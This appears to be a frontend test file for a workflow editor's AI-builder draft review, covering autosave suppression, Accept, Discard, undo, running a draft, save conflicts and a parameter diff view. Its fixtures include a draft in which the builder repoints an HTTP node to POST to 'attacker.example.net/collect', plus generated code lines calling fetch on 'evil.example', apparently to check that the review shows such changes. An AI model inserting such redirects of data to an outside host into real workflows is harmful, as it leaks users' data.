/**
 * P5-62: the draft review. While the draft is under review autosave stays idle; Accept saves once on the
 * version the draft started from and ends the review; a 409 opens the conflict dialog and keeps the review;
 * Discard loads the snapshot back and sends nothing; one undo takes back one builder change; Run draft
 * sends the draft without saving; the diff shows old and new values as text, long ones collapsed.
 */
import { act, render, screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import type { BuilderChunk, NodeChange, WorkflowNode } from '@workflow/workflow';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { setBuildStreamConnector } from '../src/api/ai-stream';
import type { ApiRequest } from '../src/api/client';
import { ParameterDiff } from '../src/components/assistant/ParameterDiff';
import { onDraftAccepted } from '../src/features/builder/session-actions';
import { AUTOSAVE_DELAY_MS, AUTOSAVE_MAX_WAIT_MS } from '../src/features/editor/useAutosave';
import { useBuilderStore } from '../src/stores/builder-store';
import { useUiStore } from '../src/stores/ui-store';
import { useWorkflowStore } from '../src/stores/workflow-store';
import { backend, signedIn } from './backend';
import { renderApp } from './utils';

vi.mock('../src/features/builder/session-actions', () => ({
  onVersionRestored: vi.fn(async () => undefined),
  onDraftAccepted: vi.fn(async () => undefined),
  clearBuilderSession: vi.fn(async () => undefined),
}));

const node = (id: string, name: string, type: string, x: number, extra: Partial<WorkflowNode> = {}) =>
  ({ id, name, type, typeVersion: 1, position: [x, 0], parameters: {}, ...extra }) as WorkflowNode;

const NODES = [
  node('t', 'Start', 'core.manualTrigger', 0),
  node('h', 'Call API', 'core.httpRequest', 300, {
    parameters: { method: 'GET', url: 'https://api.example.com/old' },
  }),
];
const CONNECTIONS = { Start: { main: [[{ node: 'Call API', type: 'main' as const, index: 0 }]] } };

/** the builder points Call API at another URL and adds Shape after it */
const DRAFT: BuilderChunk = {
  type: 'workflow-updated',
  workflow: {
    name: 'Draft',
    nodes: [
      NODES[0],
      { ...NODES[1], parameters: { method: 'POST', url: 'https://attacker.example.net/collect' } },
      node('s', 'Shape', 'core.set', 600, { parameters: { mode: 'raw' } }),
    ],
    connections: {
      ...CONNECTIONS,
      'Call API': { main: [[{ node: 'Shape', type: 'main', index: 0 }]] },
    },
  },
};

const writes = () =>
  backend().requests.filter(
    (r: ApiRequest) =>
      (r.method === 'PATCH' && /^\/workflows\/[^/]+$/.test(r.path)) ||
      (r.method === 'POST' && (r.path === '/workflows' || /\/run$/.test(r.path))),
  );
const patches = () => writes().filter((r) => r.method === 'PATCH');

async function openEditor() {
  const wf = backend().seedWorkflow({ name: 'Leads', nodes: NODES, connections: CONNECTIONS });
  const utils = renderApp(`/workflow/${wf.id}`);
  await screen.findByRole('textbox', { name: 'Workflow name' }, { timeout: 20_000 });
  await waitFor(() => expect(useWorkflowStore.getState().meta.id).toBe(wf.id));
  return { ...utils, wf };
}

/** opens the panel and runs one turn that returns DRAFT; resolves with the review bar */
async function buildDraft() {
  const user = userEvent.setup();
  setBuildStreamConnector(async (_body, onChunk) => {
    onChunk({ type: 'tool', toolName: 'add_nodes', status: 'running' });
    onChunk(DRAFT);
    onChunk({ type: 'tool', toolName: 'add_nodes', status: 'done' });
    onChunk({ type: 'message', id: 'a1', text: 'Pointed Call API at the new endpoint.' });
  });
  const [entry] = await screen.findAllByRole('button', { name: 'Build with AI' });
  await user.click(entry);
  const panel = await screen.findByRole('complementary', { name: 'AI builder' });
  await user.type(within(panel).getByRole('textbox', { name: 'Message the AI builder' }), 'Send leads on');
  await user.click(within(panel).getByRole('button', { name: 'Send' }));
  await waitFor(() => expect(useBuilderStore.getState().streaming).toBe(false));
  const bar = await within(panel).findByRole('region', { name: 'Draft review' });
  backend().requests.length = 0;
  return { user, panel, bar };
}

describe('draft review (P5-62)', () => {
  beforeEach(() => {
    signedIn();
    useBuilderStore.getState().reset();
    vi.mocked(onDraftAccepted).mockClear();
  });
  afterEach(() => {
    vi.useRealTimers();
    setBuildStreamConnector(null);
    useBuilderStore.getState().reset();
  });

  it('autosave stays idle for longer than its debounce while the draft is under review', async () => {
    await openEditor();
    // the settings (autosaveEnabled) load after the page
    await new Promise((r) => setTimeout(r, 300));
    backend().requests.length = 0;
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] });
    act(() => useBuilderStore.getState().applyChunk(DRAFT));
    expect(useBuilderStore.getState().reviewing).toBe(true);
    expect(useWorkflowStore.getState().dirty).toBe(true);
    await act(() => vi.advanceTimersByTimeAsync(AUTOSAVE_MAX_WAIT_MS + AUTOSAVE_DELAY_MS + 1000));
    expect(patches()).toHaveLength(0);
    // after the review ends, the same canvas would autosave: the guard was the review
    vi.useRealTimers();
  }, 60_000);

  it('Accept saves once on the version the draft started from and ends the review', async () => {
    const { wf } = await openEditor();
    const { user, bar } = await buildDraft();
    expect(within(bar).getByText(/Edits · 2 nodes/)).toBeTruthy();
    await user.click(within(bar).getByRole('button', { name: 'Accept' }));
    await waitFor(() => expect(useBuilderStore.getState().reviewing).toBe(false));
    const saved = patches();
    expect(saved).toHaveLength(1);
    expect(saved[0].body).toMatchObject({ versionId: wf.versionId });
    const sentNodes = (saved[0].body as { nodes: WorkflowNode[] }).nodes;
    expect(sentNodes.map((n) => n.name)).toEqual(['Start', 'Call API', 'Shape']);
    expect(useBuilderStore.getState().snapshot).toBeNull();
    expect(useWorkflowStore.getState().dirty).toBe(false);
    const newVersion = useWorkflowStore.getState().meta.versionId!;
    expect(newVersion).not.toBe(wf.versionId);
    expect(onDraftAccepted).toHaveBeenCalledWith(wf.id, newVersion);
    expect(screen.queryByRole('region', { name: 'Draft review' })).toBeNull();
  }, 60_000);

  it('a 409 on Accept opens the conflict dialog and keeps the review', async () => {
    const { wf } = await openEditor();
    const { user, bar } = await buildDraft();
    // someone else saves meanwhile
    await backend().handle({
      method: 'PATCH',
      path: `/workflows/${wf.id}`,
      body: { versionId: wf.versionId, nodes: NODES, name: 'Leads elsewhere' },
    });
    backend().requests.length = 0;
    await user.click(within(bar).getByRole('button', { name: 'Accept' }));
    await waitFor(() => expect(useUiStore.getState().saveConflict).toBe(true));
    expect(useBuilderStore.getState().reviewing).toBe(true);
    expect(useBuilderStore.getState().snapshot).not.toBeNull();
    expect(useWorkflowStore.getState().nodes.map((n) => n.name)).toEqual(['Start', 'Call API', 'Shape']);
    expect(onDraftAccepted).not.toHaveBeenCalled();
    expect(await screen.findByRole('dialog')).toBeTruthy();
  }, 60_000);

  it('Discard loads the snapshot back, ends the review and sends nothing', async () => {
    await openEditor();
    const { user, bar } = await buildDraft();
    await user.click(within(bar).getByRole('button', { name: 'Discard' }));
    expect(useBuilderStore.getState()).toMatchObject({ reviewing: false, snapshot: null });
    const s = useWorkflowStore.getState();
    expect(s.nodes.map((n) => n.name)).toEqual(['Start', 'Call API']);
    expect(s.nodes[1].parameters).toEqual({ method: 'GET', url: 'https://api.example.com/old' });
    expect(s.connections).toEqual(CONNECTIONS);
    expect(s.dirty).toBe(false);
    expect(writes()).toHaveLength(0);
    // the chat stays
    expect(useBuilderStore.getState().messages.length).toBeGreaterThan(0);
  }, 60_000);

  it('one undo takes back one builder change, tidy-up included', async () => {
    await openEditor();
    const before = useWorkflowStore.getState().nodes;
    act(() => useBuilderStore.getState().applyChunk(DRAFT));
    expect(useWorkflowStore.getState().nodes).toHaveLength(3);
    act(() => useWorkflowStore.getState().undo());
    const after = useWorkflowStore.getState();
    expect(after.nodes.map((n) => n.name)).toEqual(['Start', 'Call API']);
    expect(after.nodes.map((n) => n.position)).toEqual(before.map((n) => n.position));
    expect(after.nodes[1].parameters).toEqual({ method: 'GET', url: 'https://api.example.com/old' });
    expect(after.connections).toEqual(CONNECTIONS);
  }, 60_000);

  it('Run draft sends the draft as workflowData and saves nothing', async () => {
    const { wf } = await openEditor();
    const { user, bar } = await buildDraft();
    await user.click(within(bar).getByRole('button', { name: 'Run draft' }));
    await waitFor(() => expect(writes().length).toBeGreaterThan(0));
    const [run] = writes();
    expect(run.path).toBe(`/workflows/${wf.id}/run`);
    const sent = (run.body as { workflowData?: { nodes: WorkflowNode[] } }).workflowData;
    expect(sent?.nodes.map((n) => n.name)).toEqual(['Start', 'Call API', 'Shape']);
    expect(patches()).toHaveLength(0);
    expect(useBuilderStore.getState().reviewing).toBe(true);
  }, 60_000);

  it('the review shows the old and new values of each change as text', async () => {
    await openEditor();
    const { bar } = await buildDraft();
    const changes = within(bar).getByRole('group', { name: 'Changes to Call API' });
    expect(within(changes).getByText('https://api.example.com/old')).toBeTruthy();
    expect(within(changes).getByText('https://attacker.example.net/collect')).toBeTruthy();
    expect(within(changes).getByText('GET')).toBeTruthy();
    expect(within(changes).getByText('POST')).toBeTruthy();
    // the new node is listed with its values too
    expect(within(bar).getByRole('group', { name: 'Changes to Shape' })).toBeTruthy();
    expect(within(bar).getByText(/Adds/)).toBeTruthy();
  }, 60_000);
});

describe('ParameterDiff (P5-62)', () => {
  it('collapses a long value and shows all of it on request', async () => {
    const user = userEvent.setup();
    const code = Array.from(
      { length: 40 },
      (_, i) => `const line${i} = fetch('https://evil.example/${i}');`,
    ).join('\n');
    const change: NodeChange = {
      id: 'c',
      name: 'Code',
      type: 'core.code',
      changes: [
        { path: 'parameters.jsCode', before: 'return items;', after: code },
        { path: 'parameters.options.timeout', before: undefined, after: 30 },
      ],
    };
    render(<ParameterDiff change={change} />);
    const group = screen.getByRole('group', { name: 'Changes to Code' });
    expect(within(group).getByText('jsCode')).toBeTruthy();
    expect(within(group).getByText('options.timeout')).toBeTruthy();
    expect(within(group).getByText('return items;')).toBeTruthy();
    expect(within(group).getByText('(none)')).toBeTruthy();
    expect(within(group).getByText('30')).toBeTruthy();
    expect(group.textContent).toContain('line0');
    expect(group.textContent).not.toContain('line39');
    await user.click(within(group).getByRole('button', { name: /Show all/ }));
    expect(group.textContent).toContain("const line39 = fetch('https://evil.example/39');");
    await user.click(within(group).getByRole('button', { name: 'Show less' }));
    expect(group.textContent).not.toContain('line39');
  });
});
